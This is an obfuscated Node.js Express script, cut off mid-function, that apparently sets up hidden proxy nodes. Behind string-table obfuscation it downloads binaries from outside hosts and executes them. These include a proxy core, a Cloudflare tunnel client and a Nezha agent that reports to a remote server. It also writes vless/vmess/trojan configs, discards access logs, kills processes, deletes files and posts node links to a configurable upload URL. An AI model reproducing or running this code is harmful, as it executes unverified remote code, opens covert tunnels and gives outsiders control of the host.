const _0x30d983=_0x2af5;(function(_0x4bb251,_0x56d94b){const _0x2ee8a3={_0xed8b26:0x189,_0x301616:0x161,_0x352494:0x1ed},_0x5859bb=_0x2af5,_0x2d9a80=_0x4bb251();while(!![]){try{const _0x33bedf=-parseInt(_0x5859bb(_0x2ee8a3._0xed8b26))/0x1*(-parseInt(_0x5859bb(0x1c2))/0x2)+parseInt(_0x5859bb(0x17a))/0x3*(parseInt(_0x5859bb(0x177))/0x4)+-parseInt(_0x5859bb(0x167))/0x5+-parseInt(_0x5859bb(_0x2ee8a3._0x301616))/0x6+-parseInt(_0x5859bb(0x1d4))/0x7+-parseInt(_0x5859bb(0x156))/0x8+parseInt(_0x5859bb(_0x2ee8a3._0x352494))/0x9;if(_0x33bedf===_0x56d94b)break;else _0x2d9a80['push'](_0x2d9a80['shift']());}catch(_0x58a3ac){_0x2d9a80['push'](_0x2d9a80['shift']());}}}(_0x1a7f,0x63489));const express=require(_0x30d983(0x1cd)),app=express(),axios=require('axios'),os=require('os'),fs=require('fs'),path=require(_0x30d983(0x18a)),{promisify}=require('util'),exec=promisify(require(_0x30d983(0x1ba))[_0x30d983(0x1b1)]),{execSync}=require(_0x30d983(0x1ba)),UPLOAD_URL=process[_0x30d983(0x17c)]['UPLOAD_URL']||'',PROJECT_URL=process[_0x30d983(0x17c)][_0x30d983(0x15d)]||'',AUTO_ACCESS=process[_0x30d983(0x17c)][_0x30d983(0x195)]||![],FILE_PATH=process[_0x30d983(0x17c)][_0x30d983(0x18d)]||_0x30d983(0x1e6),SUB_PATH=process[_0x30d983(0x17c)][_0x30d983(0x1ff)]||_0x30d983(0x1a6),PORT=process[_0x30d983(0x17c)][_0x30d983(0x1c1)]||process[_0x30d983(0x17c)][_0x30d983(0x205)]||0xbb8,UUID=process[_0x30d983(0x17c)][_0x30d983(0x1c3)]||'4d4453c9-8b1c-4a16-a9f5-02f7998ac99c',NEZHA_SERVER=process['env'][_0x30d983(0x196)]||'',NEZHA_PORT=process[_0x30d983(0x17c)][_0x30d983(0x1a5)]||'',NEZHA_KEY=process[_0x30d983(0x17c)][_0x30d983(0x200)]||'',ARGO_DOMAIN=process['env']['ARGO_DOMAIN']||_0x30d983(0x204),ARGO_AUTH=process[_0x30d983(0x17c)][_0x30d983(0x1ec)]||_0x30d983(0x20a),ARGO_PORT=process[_0x30d983(0x17c)][_0x30d983(0x1da)]||0x1f41,CFIP=process[_0x30d983(0x17c)][_0x30d983(0x1ce)]||_0x30d983(0x20c),CFPORT=process[_0x30d983(0x17c)][_0x30d983(0x1de)]||0x1bb,NAME=process[_0x30d983(0x17c)][_0x30d983(0x18f)]||'';!fs[_0x30d983(0x216)](FILE_PATH)?(fs[_0x30d983(0x1fd)](FILE_PATH),console[_0x30d983(0x15a)](FILE_PATH+'\x20is\x20created')):console[_0x30d983(0x15a)](FILE_PATH+_0x30d983(0x184));function generateRandomName(){const _0x2574c1={_0x5476a6:0x16b,_0x494338:0x1bd,_0x252b43:0x1f3,_0x6a8084:0x210},_0x46024a=_0x30d983,_0x73148b='abcdefghijklmnopqrstuvwxyz';let _0x90397f='';for(let _0x1e8a21=0x0;_0x1e8a21<0x6;_0x1e8a21++){_0x90397f+=_0x73148b[_0x46024a(_0x2574c1._0x5476a6)](Math[_0x46024a(_0x2574c1._0x494338)](Math[_0x46024a(_0x2574c1._0x252b43)]()*_0x73148b[_0x46024a(_0x2574c1._0x6a8084)]));}return _0x90397f;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x30d983(0x154)](FILE_PATH,npmName),phpPath=path['join'](FILE_PATH,phpName),webPath=path['join'](FILE_PATH,webName),botPath=path[_0x30d983(0x154)](FILE_PATH,botName),subPath=path[_0x30d983(0x154)](FILE_PATH,_0x30d983(0x1db)),listPath=path[_0x30d983(0x154)](FILE_PATH,_0x30d983(0x160)),bootLogPath=path[_0x30d983(0x154)](FILE_PATH,'boot.log'),configPath=path[_0x30d983(0x154)](FILE_PATH,'config.json');function deleteNodes(){const _0x5dad63={_0x2ed91a:0x216,_0x49dda7:0x1ae,_0x252324:0x16a,_0xb1f35e:0x210,_0x46f2f3:0x17d,_0x62e07a:0x1b4,_0x53c71f:0x151},_0x4dccb7=_0x30d983;try{if(!UPLOAD_URL)return;if(!fs[_0x4dccb7(_0x5dad63._0x2ed91a)](subPath))return;let _0x185b59;try{_0x185b59=fs[_0x4dccb7(_0x5dad63._0x49dda7)](subPath,_0x4dccb7(0x158));}catch{return null;}const _0x179292=Buffer[_0x4dccb7(0x188)](_0x185b59,'base64')[_0x4dccb7(_0x5dad63._0x252324)](_0x4dccb7(0x158)),_0xe5510d=_0x179292[_0x4dccb7(0x1e8)]('\x0a')['filter'](_0x395d24=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x4dccb7(0x1ef)](_0x395d24));if(_0xe5510d[_0x4dccb7(_0x5dad63._0xb1f35e)]===0x0)return;return axios[_0x4dccb7(_0x5dad63._0x46f2f3)](UPLOAD_URL+_0x4dccb7(_0x5dad63._0x62e07a),JSON['stringify']({'nodes':_0xe5510d}),{'headers':{'Content-Type':_0x4dccb7(_0x5dad63._0x53c71f)}})['catch'](_0x1b6f98=>{return null;}),null;}catch(_0x476b34){return null;}}function cleanupOldFiles(){const _0x5c06f6=_0x30d983;try{const _0x2dfbda=fs[_0x5c06f6(0x1a3)](FILE_PATH);_0x2dfbda[_0x5c06f6(0x1a2)](_0x1f71dd=>{const _0x4f9441=_0x5c06f6,_0x347436=path[_0x4f9441(0x154)](FILE_PATH,_0x1f71dd);try{const _0x54774e=fs['statSync'](_0x347436);_0x54774e[_0x4f9441(0x1a4)]()&&fs['unlinkSync'](_0x347436);}catch(_0x25a7e7){}});}catch(_0x29f9a2){}}app[_0x30d983(0x17f)]('/',function(_0x4f7be8,_0x188074){const _0x1cc113={_0x12e362:0x214},_0x4df373=_0x30d983;_0x188074[_0x4df373(0x182)](_0x4df373(_0x1cc113._0x12e362));});async function generateConfig(){const _0x221a9c={_0x5c5a1a:0x1c6,_0x153afd:0x1b5,_0x8abe4:0x1c6,_0x457226:0x1c5,_0x3595e4:0x20d,_0x2e7c1c:0x1cb,_0x38aa0f:0x172,_0x2d2ed6:0x1cb,_0x4c6b7e:0x1c6,_0xc2d61d:0x1e0,_0x3f92d3:0x211,_0x5c1e45:0x1e0,_0x371b79:0x1c4,_0x210adf:0x1b6,_0x5c78a6:0x1b2,_0x1221c5:0x170,_0x5c42b1:0x19c},_0x5b7026=_0x30d983,_0x53abb3={'log':{'access':'/dev/null','error':_0x5b7026(0x19d),'loglevel':_0x5b7026(_0x221a9c._0x5c5a1a)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x5b7026(0x172),'settings':{'clients':[{'id':UUID,'flow':_0x5b7026(_0x221a9c._0x153afd)}],'decryption':_0x5b7026(_0x221a9c._0x8abe4),'fallbacks':[{'dest':0xbb9},{'path':_0x5b7026(_0x221a9c._0x457226),'dest':0xbba},{'path':_0x5b7026(_0x221a9c._0x3595e4),'dest':0xbbb},{'path':_0x5b7026(0x1c4),'dest':0xbbc}]},'streamSettings':{'network':_0x5b7026(0x1a0)}},{'port':0xbb9,'listen':_0x5b7026(_0x221a9c._0x2e7c1c),'protocol':_0x5b7026(_0x221a9c._0x38aa0f),'settings':{'clients':[{'id':UUID}],'decryption':_0x5b7026(0x1c6)},'streamSettings':{'network':'tcp','security':_0x5b7026(0x1c6)}},{'port':0xbba,'listen':_0x5b7026(_0x221a9c._0x2d2ed6),'protocol':_0x5b7026(0x172),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x5b7026(0x1c6)},'streamSettings':{'network':'ws','security':_0x5b7026(_0x221a9c._0x4c6b7e),'wsSettings':{'path':_0x5b7026(0x1c5)}},'sniffing':{'enabled':!![],'destOverride':[_0x5b7026(_0x221a9c._0xc2d61d),_0x5b7026(_0x221a9c._0x3f92d3),_0x5b7026(0x18b)],'metadataOnly':![]}},{'port':0xbbb,'listen':'127.0.0.1','protocol':'vmess','settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':'/vmess-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x5b7026(_0x221a9c._0x5c1e45),_0x5b7026(0x211),_0x5b7026(0x18b)],'metadataOnly':![]}},{'port':0xbbc,'listen':'127.0.0.1','protocol':'trojan','settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x5b7026(_0x221a9c._0x371b79)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x5b7026(0x211),_0x5b7026(0x18b)],'metadataOnly':![]}}],'dns':{'servers':['https+local://8.8.8.8/dns-query']},'outbounds':[{'protocol':_0x5b7026(_0x221a9c._0x210adf),'tag':_0x5b7026(0x19f)},{'protocol':_0x5b7026(_0x221a9c._0x5c78a6),'tag':_0x5b7026(_0x221a9c._0x1221c5)}]};fs[_0x5b7026(0x1f2)](path[_0x5b7026(0x154)](FILE_PATH,'config.json'),JSON[_0x5b7026(_0x221a9c._0x5c42b1)](_0x53abb3,null,0x2));}function _0x2af5(_0x44a643,_0x2e5685){const _0x1a7f22=_0x1a7f();return _0x2af5=function(_0x2af505,_0x339fef){_0x2af505=_0x2af505-0x150;let _0xb18aa2=_0x1a7f22[_0x2af505];return _0xb18aa2;},_0x2af5(_0x44a643,_0x2e5685);}function getSystemArchitecture(){const _0x5b253c={_0x21d074:0x1e2,_0x1b54c9:0x17e},_0x5a084b=_0x30d983,_0xdc92f7=os[_0x5a084b(0x19b)]();return _0xdc92f7===_0x5a084b(0x1fb)||_0xdc92f7===_0x5a084b(_0x5b253c._0x21d074)||_0xdc92f7===_0x5a084b(0x1fa)?_0x5a084b(0x1fb):_0x5a084b(_0x5b253c._0x1b54c9);}function downloadFile(_0x351029,_0x3806c7,_0x1cbba1){const _0x48538f={_0x4f9e72:0x1f5},_0x1d4ffc={_0x359457:0x1d2},_0x48e7c3={_0x11114f:0x1d6,_0x54fdaf:0x1af,_0x37e004:0x1d2},_0xa2ac27=_0x30d983,_0x44ec3e=_0x351029;!fs[_0xa2ac27(0x216)](FILE_PATH)&&fs[_0xa2ac27(0x1fd)](FILE_PATH,{'recursive':!![]});const _0x4fac8f=fs[_0xa2ac27(_0x48538f._0x4f9e72)](_0x44ec3e);axios({'method':'get','url':_0x3806c7,'responseType':_0xa2ac27(0x1b7)})[_0xa2ac27(0x1bb)](_0x3b8b0a=>{const _0x33a096={_0x1e1a60:0x1fe,_0x191e14:0x1ad,_0x1ccd40:0x201},_0x3eea00={_0x2eaa2b:0x1dc,_0x428723:0x201},_0x1dcfd9=_0xa2ac27;_0x3b8b0a[_0x1dcfd9(_0x48e7c3._0x11114f)][_0x1dcfd9(_0x48e7c3._0x54fdaf)](_0x4fac8f),_0x4fac8f['on']('finish',()=>{const _0x18410a=_0x1dcfd9;_0x4fac8f[_0x18410a(_0x3eea00._0x2eaa2b)](),console['log']('Download\x20'+path[_0x18410a(_0x3eea00._0x428723)](_0x44ec3e)+'\x20successfully'),_0x1cbba1(null,_0x44ec3e);}),_0x4fac8f['on'](_0x1dcfd9(_0x48e7c3._0x37e004),_0x501539=>{const _0x362030=_0x1dcfd9;fs[_0x362030(_0x33a096._0x1e1a60)](_0x44ec3e,()=>{});const _0x137369=_0x362030(_0x33a096._0x191e14)+path[_0x362030(_0x33a096._0x1ccd40)](_0x44ec3e)+_0x362030(0x1bc)+_0x501539[_0x362030(0x199)];console['error'](_0x137369),_0x1cbba1(_0x137369);});})[_0xa2ac27(0x20f)](_0x1d1a07=>{const _0x3eb560=_0xa2ac27,_0x2c0334=_0x3eb560(0x1ad)+path[_0x3eb560(0x201)](_0x44ec3e)+'\x20failed:\x20'+_0x1d1a07[_0x3eb560(0x199)];console[_0x3eb560(_0x1d4ffc._0x359457)](_0x2c0334),_0x1cbba1(_0x2c0334);});}async function downloadFilesAndRun(){const _0x3f72b6={_0x58b84e:0x210,_0x45200b:0x169,_0x3da38a:0x213,_0x3d636:0x176,_0x5ae521:0x1d9,_0x2757b0:0x1f7,_0x12c65b:0x1c0,_0x59da6e:0x190,_0x44b25a:0x173,_0x28f161:0x153,_0x4516a8:0x1b9,_0x271fe4:0x1f2,_0x5b8f03:0x166,_0xffd3d1:0x163,_0x1e371e:0x162,_0x5e1f32:0x1d2,_0x23d0ec:0x207,_0x4c3c2b:0x1a1,_0xdfcf50:0x18e,_0x34c802:0x1ab,_0x137ba8:0x15a,_0x24d5ec:0x206,_0x356bdc:0x197,_0x3739d4:0x181,_0xc5c4e5:0x174,_0x282ef0:0x15a,_0x567d4b:0x159,_0xbddc5e:0x1d7,_0x25e28f:0x171,_0x2c73c4:0x179,_0x494095:0x1bf,_0x11cd15:0x1b3,_0x5e5ecb:0x15a},_0x5b7823={_0x11c8c6:0x1a2},_0x4b5423={_0x1886d4:0x216},_0x12c4c8={_0x35f9c6:0x164,_0x17c52b:0x1f1},_0x1981e8=_0x30d983,_0x4e5210=getSystemArchitecture(),_0x20b422=getFilesForArchitecture(_0x4e5210);if(_0x20b422[_0x1981e8(_0x3f72b6._0x58b84e)]===0x0){console[_0x1981e8(0x15a)](_0x1981e8(_0x3f72b6._0x45200b));return;}const _0x2838b7=_0x20b422[_0x1981e8(0x1d1)](_0x3f808a=>{return new Promise((_0x35c7e1,_0x98721b)=>{const _0x494cce=_0x2af5;downloadFile(_0x3f808a[_0x494cce(_0x12c4c8._0x35f9c6)],_0x3f808a[_0x494cce(_0x12c4c8._0x17c52b)],(_0x21f380,_0x5235d3)=>{_0x21f380?_0x98721b(_0x21f380):_0x35c7e1(_0x5235d3);});});});try{await Promise[_0x1981e8(_0x3f72b6._0x3da38a)](_0x2838b7);}catch(_0x2698bb){console[_0x1981e8(0x1d2)](_0x1981e8(_0x3f72b6._0x3d636),_0x2698bb);return;}function _0x51e84d(_0x4b2a7b){const _0x742a64=_0x1981e8,_0x26c41b=0x1fd;_0x4b2a7b[_0x742a64(_0x5b7823._0x11c8c6)](_0x51799e=>{const _0x1a8b87={_0x5a8561:0x175},_0x1df89d=_0x742a64;fs[_0x1df89d(_0x4b5423._0x1886d4)](_0x51799e)&&fs[_0x1df89d(0x1dd)](_0x51799e,_0x26c41b,_0x505cf4=>{const _0x17f197=_0x1df89d;_0x505cf4?console[_0x17f197(0x1d2)](_0x17f197(_0x1a8b87._0x5a8561)+_0x51799e+':\x20'+_0x505cf4):console[_0x17f197(0x15a)](_0x17f197(0x187)+_0x51799e+':\x20'+_0x26c41b['toString'](0x8));});});}const _0x58533f=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x51e84d(_0x58533f);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x594f6d=NEZHA_SERVER[_0x1981e8(0x1cf)](':')?NEZHA_SERVER['split'](':')[_0x1981e8(0x15e)]():'',_0x18c902=new Set(['443','8443','2096',_0x1981e8(_0x3f72b6._0x5ae521),_0x1981e8(_0x3f72b6._0x2757b0),_0x1981e8(_0x3f72b6._0x12c65b)]),_0x31eb9f=_0x18c902[_0x1981e8(_0x3f72b6._0x59da6e)](_0x594f6d)?_0x1981e8(0x155):'false',_0x401078=_0x1981e8(_0x3f72b6._0x44b25a)+NEZHA_KEY+_0x1981e8(_0x3f72b6._0x28f161)+NEZHA_SERVER+_0x1981e8(0x1ac)+_0x31eb9f+_0x1981e8(_0x3f72b6._0x4516a8)+UUID;fs[_0x1981e8(_0x3f72b6._0x271fe4)](path[_0x1981e8(0x154)](FILE_PATH,_0x1981e8(_0x3f72b6._0x5b8f03)),_0x401078);const _0x130fcf=_0x1981e8(0x197)+phpPath+_0x1981e8(_0x3f72b6._0xffd3d1)+FILE_PATH+_0x1981e8(_0x3f72b6._0x1e371e);try{await exec(_0x130fcf),console[_0x1981e8(0x15a)](phpName+_0x1981e8(0x159)),await new Promise(_0x36927b=>setTimeout(_0x36927b,0x3e8));}catch(_0x3dc522){console[_0x1981e8(_0x3f72b6._0x5e1f32)](_0x1981e8(0x1e4)+_0x3dc522);}}else{let _0x46ad69='';const _0x2d0f8a=['443','8443',_0x1981e8(_0x3f72b6._0x23d0ec),_0x1981e8(0x1d9),_0x1981e8(_0x3f72b6._0x2757b0),_0x1981e8(_0x3f72b6._0x12c65b)];_0x2d0f8a['includes'](NEZHA_PORT)&&(_0x46ad69='--tls');const _0x533cbe=_0x1981e8(0x197)+npmPath+_0x1981e8(0x1eb)+NEZHA_SERVER+':'+NEZHA_PORT+_0x1981e8(_0x3f72b6._0x4c3c2b)+NEZHA_KEY+'\x20'+_0x46ad69+_0x1981e8(_0x3f72b6._0xdfcf50);try{await exec(_0x533cbe),console['log'](npmName+_0x1981e8(0x159)),await new Promise(_0x46f822=>setTimeout(_0x46f822,0x3e8));}catch(_0x29c3a3){console[_0x1981e8(0x1d2)](_0x1981e8(_0x3f72b6._0x34c802)+_0x29c3a3);}}}else console[_0x1981e8(_0x3f72b6._0x137ba8)](_0x1981e8(_0x3f72b6._0x24d5ec));const _0x2ee0a1=_0x1981e8(_0x3f72b6._0x356bdc)+webPath+_0x1981e8(_0x3f72b6._0x3739d4)+FILE_PATH+_0x1981e8(_0x3f72b6._0xc5c4e5);try{await exec(_0x2ee0a1),console[_0x1981e8(_0x3f72b6._0x282ef0)](webName+_0x1981e8(_0x3f72b6._0x567d4b)),await new Promise(_0x558121=>setTimeout(_0x558121,0x3e8));}catch(_0x4a965e){console[_0x1981e8(_0x3f72b6._0x5e1f32)](_0x1981e8(_0x3f72b6._0xbddc5e)+_0x4a965e);}if(fs['existsSync'](botPath)){let _0x471122;if(ARGO_AUTH[_0x1981e8(0x179)](/^[A-Z0-9a-z=]{120,250}$/))_0x471122=_0x1981e8(_0x3f72b6._0x25e28f)+ARGO_AUTH;else ARGO_AUTH[_0x1981e8(_0x3f72b6._0x2c73c4)](/TunnelSecret/)?_0x471122=_0x1981e8(_0x3f72b6._0x494095)+FILE_PATH+'/tunnel.yml\x20run':_0x471122='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x1981e8(_0x3f72b6._0x11cd15)+ARGO_PORT;try{await exec(_0x1981e8(_0x3f72b6._0x356bdc)+botPath+'\x20'+_0x471122+_0x1981e8(0x1d0)),console[_0x1981e8(_0x3f72b6._0x5e5ecb)](botName+_0x1981e8(0x159)),await new Promise(_0x268fd6=>setTimeout(_0x268fd6,0x7d0));}catch(_0x125ab0){console[_0x1981e8(0x1d2)](_0x1981e8(0x1a8)+_0x125ab0);}}await new Promise(_0x5664a0=>setTimeout(_0x5664a0,0x1388));}function getFilesForArchitecture(_0x383ff4){const _0x2ddb27={_0x5ec626:0x19a,_0x5dbfb2:0x157,_0x472773:0x193},_0x63d4cd=_0x30d983;let _0x3ecc42;_0x383ff4===_0x63d4cd(0x1fb)?_0x3ecc42=[{'fileName':webPath,'fileUrl':_0x63d4cd(_0x2ddb27._0x5ec626)},{'fileName':botPath,'fileUrl':_0x63d4cd(0x1d3)}]:_0x3ecc42=[{'fileName':webPath,'fileUrl':'https://amd64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0x63d4cd(0x152)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x46ef3e=_0x383ff4==='arm'?_0x63d4cd(_0x2ddb27._0x5dbfb2):_0x63d4cd(0x1aa);_0x3ecc42[_0x63d4cd(0x193)]({'fileName':npmPath,'fileUrl':_0x46ef3e});}else{const _0x2d5678=_0x383ff4===_0x63d4cd(0x1fb)?'https://arm64.ssss.nyc.mn/v1':_0x63d4cd(0x1e1);_0x3ecc42[_0x63d4cd(_0x2ddb27._0x472773)]({'fileName':phpPath,'fileUrl':_0x2d5678});}}return _0x3ecc42;}function argoType(){const _0x4895c1={_0x5d1e4c:0x212,_0x25cfb1:0x154,_0x148a27:0x1e3,_0x353eea:0x154,_0x2af1eb:0x15a},_0x3dbd21=_0x30d983;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x3dbd21(0x15a)](_0x3dbd21(0x1b8));return;}if(ARGO_AUTH['includes'](_0x3dbd21(_0x4895c1._0x5d1e4c))){fs['writeFileSync'](path['join'](FILE_PATH,_0x3dbd21(0x1e3)),ARGO_AUTH);const _0x4127cf=_0x3dbd21(0x1cc)+ARGO_AUTH[_0x3dbd21(0x1e8)]('\x22')[0xb]+_0x3dbd21(0x20e)+path[_0x3dbd21(_0x4895c1._0x25cfb1)](FILE_PATH,_0x3dbd21(_0x4895c1._0x148a27))+_0x3dbd21(0x1b0)+ARGO_DOMAIN+_0x3dbd21(0x185)+ARGO_PORT+'\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20';fs[_0x3dbd21(0x1f2)](path[_0x3dbd21(_0x4895c1._0x353eea)](FILE_PATH,_0x3dbd21(0x15f)),_0x4127cf);}else console[_0x3dbd21(_0x4895c1._0x2af1eb)](_0x3dbd21(0x1ee));}async function extractDomains(){const _0x3982c4={_0x105921:0x1e7,_0x5f023d:0x1ae,_0x482b03:0x154,_0x3718ff:0x1a2,_0x417193:0x183,_0x92e854:0x16c,_0x23ba85:0x1b3,_0x425716:0x1d0,_0x5d066a:0x159,_0x10519d:0x1a8},_0x2650d5={_0xc8548c:0x1d6,_0x838779:0x1d6,_0x5dc2f4:0x202,_0x4d8fb0:0x17f,_0x28ede7:0x186,_0x1ae5a9:0x1d6,_0x13e629:0x16d,_0x3f2047:0x1d6},_0x141968={_0x88073e:0x1a9,_0x44dfdb:0x1fc,_0x1b615f:0x1df},_0x10406a={_0x4eb88e:0x179},_0x27409d=_0x30d983;let _0x264b3c;if(ARGO_AUTH&&ARGO_DOMAIN)_0x264b3c=ARGO_DOMAIN,console[_0x27409d(0x15a)](_0x27409d(_0x3982c4._0x105921),_0x264b3c),await _0x4fe14e(_0x264b3c);else try{const _0x207717=fs[_0x27409d(_0x3982c4._0x5f023d)](path[_0x27409d(_0x3982c4._0x482b03)](FILE_PATH,_0x27409d(0x16c)),_0x27409d(0x158)),_0x462984=_0x207717['split']('\x0a'),_0x348fad=[];_0x462984[_0x27409d(_0x3982c4._0x3718ff)](_0x56e309=>{const _0x1262e6=_0x27409d,_0x59cf9b=_0x56e309[_0x1262e6(_0x10406a._0x4eb88e)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x59cf9b){const _0x29b27d=_0x59cf9b[0x1];_0x348fad[_0x1262e6(0x150)](_0x29b27d);}});if(_0x348fad['length']>0x0)_0x264b3c=_0x348fad[0x0],console['log']('ArgoDomain:',_0x264b3c),await _0x4fe14e(_0x264b3c);else{console['log'](_0x27409d(0x203)),fs[_0x27409d(_0x3982c4._0x417193)](path[_0x27409d(0x154)](FILE_PATH,_0x27409d(_0x3982c4._0x92e854)));async function _0x52bc19(){const _0x1fc770=_0x27409d;try{process[_0x1fc770(_0x141968._0x88073e)]==='win32'?await exec('taskkill\x20/f\x20/im\x20'+botName+_0x1fc770(_0x141968._0x44dfdb)):await exec(_0x1fc770(_0x141968._0x1b615f)+botName[_0x1fc770(0x16b)](0x0)+']'+botName[_0x1fc770(0x215)](0x1)+_0x1fc770(0x165));}catch(_0x3ae897){}}_0x52bc19(),await new Promise(_0x599d07=>setTimeout(_0x599d07,0xbb8));const _0x380bb8=_0x27409d(0x1e9)+FILE_PATH+_0x27409d(_0x3982c4._0x23ba85)+ARGO_PORT;try{await exec(_0x27409d(0x197)+botPath+'\x20'+_0x380bb8+_0x27409d(_0x3982c4._0x425716)),console['log'](botName+_0x27409d(_0x3982c4._0x5d066a)),await new Promise(_0x1dc082=>setTimeout(_0x1dc082,0xbb8)),await extractDomains();}catch(_0x4d5566){console['error'](_0x27409d(_0x3982c4._0x10519d)+_0x4d5566);}}}catch(_0x2ee077){console[_0x27409d(0x1d2)]('Error\x20reading\x20boot.log:',_0x2ee077);}async function _0x2e0cc0(){const _0xe07443=_0x27409d;try{const _0x22476d=await axios[_0xe07443(0x17f)]('https://ipapi.co/json/',{'timeout':0xbb8});if(_0x22476d[_0xe07443(0x1d6)]&&_0x22476d[_0xe07443(_0x2650d5._0xc8548c)]['country_code']&&_0x22476d[_0xe07443(_0x2650d5._0x838779)][_0xe07443(0x202)])return _0x22476d[_0xe07443(0x1d6)][_0xe07443(0x17b)]+'_'+_0x22476d[_0xe07443(0x1d6)][_0xe07443(_0x2650d5._0x5dc2f4)];}catch(_0x28d54d){try{const _0x2dece2=await axios[_0xe07443(_0x2650d5._0x4d8fb0)](_0xe07443(_0x2650d5._0x28ede7),{'timeout':0xbb8});if(_0x2dece2['data']&&_0x2dece2[_0xe07443(_0x2650d5._0x1ae5a9)]['status']===_0xe07443(_0x2650d5._0x13e629)&&_0x2dece2[_0xe07443(_0x2650d5._0x3f2047)]['countryCode']&&_0x2dece2[_0xe07443(_0x2650d5._0x3f2047)][_0xe07443(0x202)])return _0x2dece2[_0xe07443(0x1d6)]['countryCode']+'_'+_0x2dece2[_0xe07443(0x1d6)]['org'];}catch(_0x380bd0){}}return _0xe07443(0x1ea);}async function _0x4fe14e(_0x33d83c){const _0x284bd0=await _0x2e0cc0(),_0x466afc=NAME?NAME+'-'+_0x284bd0:_0x284bd0;return new Promise(_0x3e42ba=>{const _0x58b65d={_0x4844f9:0x168,_0x46f9f5:0x211,_0x1e0a11:0x192,_0x1d98c2:0x16a,_0x22177b:0x15b,_0x1dfa4c:0x1f9,_0xa0a43b:0x1be,_0x41f289:0x16a,_0x3b9c52:0x1f2,_0x4836e2:0x188,_0x1241b4:0x15b,_0x11d8d7:0x15c},_0x25c81a={_0x6b52f2:0x15b,_0x5cc856:0x198};setTimeout(()=>{const _0x42cfc4=_0x2af5,_0x1a14a3={'v':'2','ps':''+_0x466afc,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':'none','net':'ws','type':'none','host':_0x33d83c,'path':_0x42cfc4(_0x58b65d._0x4844f9),'tls':_0x42cfc4(_0x58b65d._0x46f9f5),'sni':_0x33d83c,'alpn':'','fp':'firefox'},_0x193567='\x0avless://'+UUID+'@'+CFIP+':'+CFPORT+_0x42cfc4(0x1c9)+_0x33d83c+_0x42cfc4(0x1ca)+_0x33d83c+_0x42cfc4(0x1d8)+_0x466afc+_0x42cfc4(_0x58b65d._0x1e0a11)+Buffer[_0x42cfc4(0x188)](JSON[_0x42cfc4(0x19c)](_0x1a14a3))[_0x42cfc4(_0x58b65d._0x1d98c2)](_0x42cfc4(_0x58b65d._0x22177b))+_0x42cfc4(_0x58b65d._0x1dfa4c)+UUID+'@'+CFIP+':'+CFPORT+_0x42cfc4(_0x58b65d._0xa0a43b)+_0x33d83c+'&fp=firefox&type=ws&host='+_0x33d83c+_0x42cfc4(0x178)+_0x466afc+'\x0a\x20\x20\x20\x20';console[_0x42cfc4(0x15a)](Buffer['from'](_0x193567)[_0x42cfc4(_0x58b65d._0x41f289)](_0x42cfc4(_0x58b65d._0x22177b))),fs[_0x42cfc4(_0x58b65d._0x3b9c52)](subPath,Buffer[_0x42cfc4(_0x58b65d._0x4836e2)](_0x193567)[_0x42cfc4(0x16a)](_0x42cfc4(_0x58b65d._0x1241b4))),console['log'](FILE_PATH+_0x42cfc4(_0x58b65d._0x11d8d7)),uploadNodes(),app[_0x42cfc4(0x17f)]('/'+SUB_PATH,(_0x192afa,_0x5bbb0a)=>{const _0x1d251a=_0x42cfc4,_0x2dbc31=Buffer[_0x1d251a(0x188)](_0x193567)['toString'](_0x1d251a(_0x25c81a._0x6b52f2));_0x5bbb0a[_0x1d251a(0x1f6)](_0x1d251a(0x209),_0x1d251a(_0x25c81a._0x5cc856)),_0x5bbb0a[_0x1d251a(0x182)](_0x2dbc31);}),_0x3e42ba(_0x193567);},0x7d0);});}}async function uploadNodes(){const _0x393c35={_0x2d085e:0x1a7,_0x12b09a:0x151,_0x3abf3c:0x194,_0x5edf31:0x208,_0x2772fc:0x1e5,_0x3aa088:0x158,_0x5ec8a5:0x19c,_0x5abe1:0x17d,_0x3e01fa:0x15a},_0x335d54=_0x30d983;if(UPLOAD_URL&&PROJECT_URL){const _0x56d92d=PROJECT_URL+'/'+SUB_PATH,_0x17a618={'subscription':[_0x56d92d]};try{const _0x5e3b26=await axios[_0x335d54(0x17d)](UPLOAD_URL+_0x335d54(_0x393c35._0x2d085e),_0x17a618,{'headers':{'Content-Type':_0x335d54(_0x393c35._0x12b09a)}});return _0x5e3b26&&_0x5e3b26[_0x335d54(0x1e5)]===0xc8?(console[_0x335d54(0x15a)](_0x335d54(_0x393c35._0x3abf3c)),_0x5e3b26):null;}catch(_0x748a6d){if(_0x748a6d[_0x335d54(0x208)]){if(_0x748a6d[_0x335d54(_0x393c35._0x5edf31)][_0x335d54(_0x393c35._0x2772fc)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x335d54(0x216)](listPath))return;const _0x30c3aa=fs[_0x335d54(0x1ae)](listPath,_0x335d54(_0x393c35._0x3aa088)),_0x594e6d=_0x30c3aa[_0x335d54(0x1e8)]('\x0a')['filter'](_0x39860e=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x39860e));if(_0x594e6d['length']===0x0)return;const _0x3ee8bd=JSON[_0x335d54(_0x393c35._0x5ec8a5)]({'nodes':_0x594e6d});try{const _0x26b849=await axios[_0x335d54(_0x393c35._0x5abe1)](UPLOAD_URL+_0x335d54(0x1d5),_0x3ee8bd,{'headers':{'Content-Type':_0x335d54(0x151)}});return 